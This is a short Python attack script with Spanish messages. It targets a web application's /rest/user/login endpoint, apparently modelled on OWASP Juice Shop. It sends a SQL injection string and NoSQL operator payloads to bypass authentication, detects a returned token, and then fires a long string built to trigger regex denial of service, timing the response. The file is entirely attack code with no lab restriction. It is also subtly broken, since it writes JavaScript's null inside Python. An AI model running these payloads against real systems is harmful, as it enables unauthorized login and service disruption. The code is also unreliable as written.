import requests
import time
import json

def run_fuzzing_module(target_url):
    print("[*] Ejecutando Módulo Fuzzing...")
    login_endpoint = f"{target_url}/rest/user/login"

    hybrid_payloads = [
        {"email": "' OR 1=1 --", "password": "x"},
        {"email": {"$ne": null}, "password": "x"},
        {"email": {"$gt": ""}, "password": "x"}
    ]

    for payload in hybrid_payloads:
        try:
            response = requests.post(login_endpoint, json=payload)
            if response.status_code == 200 and "token" in response.json().get("authentication", {}):
                print(f"[!] Vulnerabilidad SQLi/NoSQL detectada con: {json.dumps(payload)}")
        except Exception as e:
            print(f"[-] Error: {e}")

    # Payload diseñado para causar 'Catastrophic Backtracking' en Regex
    redos_payload = {"email": "a"*1000 + "!", "password": "x"}
    
    start_time = time.time()
    try:
        requests.post(login_endpoint, json=redos_payload, timeout=10)
    except requests.exceptions.ReadTimeout:
        pass
        
    latency = time.time() - start_time
    if latency > 5.0:
        print(f"[!] ALERTA ReDoS: Latencia alta ({latency}s)")